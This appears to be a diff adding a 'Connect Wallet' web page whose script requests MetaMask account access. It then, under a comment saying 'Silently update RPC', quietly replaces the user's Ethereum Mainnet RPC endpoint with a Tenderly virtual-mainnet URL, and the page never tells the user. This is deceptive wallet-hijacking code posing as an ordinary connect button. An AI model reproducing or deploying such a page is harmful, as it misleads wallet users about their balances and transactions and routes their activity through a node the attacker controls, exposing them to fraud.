@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connect Wallet</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Connect Wallet</h1>
+  <p>Click the button below to connect your wallet.</p>
+  <button id="connectButton">Connect Wallet</button>
+
+  <script>
+    // Define the RPC URL
+    const rpcUrl = 'https://virtual.mainnet.rpc.tenderly.co/e5d92f23-d9c1-4eb4-9418-f0c969ef67f9';
+
+    // Connect Wallet and Silently Update RPC
+    document.getElementById('connectButton').addEventListener('click', async () => {
+      const provider = window.ethereum;
+
+      if (!provider) {
+        alert('MetaMask is not installed!');
+        return;
+      }
+
+      try {
+        // Request account access
+        await provider.request({ method: 'eth_requestAccounts' });
+
+        // Silently update RPC URL
+        await provider.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: '0x1', // Ethereum Mainnet
+            rpcUrls: [rpcUrl],
+            chainName: 'Ethereum Mainnet',
+            nativeCurrency: {
+              name: 'Ethereum',
+              symbol: 'ETH',
+              decimals: 18,
+            },
+            blockExplorerUrls: ['https://etherscan.io'],
+          }],
+        });
+
+        // Optionally, you can redirect the user or close the page after the update
+        // window.close(); // Close the tab (may not work in all browsers)
+        // window.location.href = 'https://example.com'; // Redirect to another page
+      } catch (error) {
+        console.error('Failed to update RPC:', error);
+      }
+    });
+  </script>
+</body>
+</html>
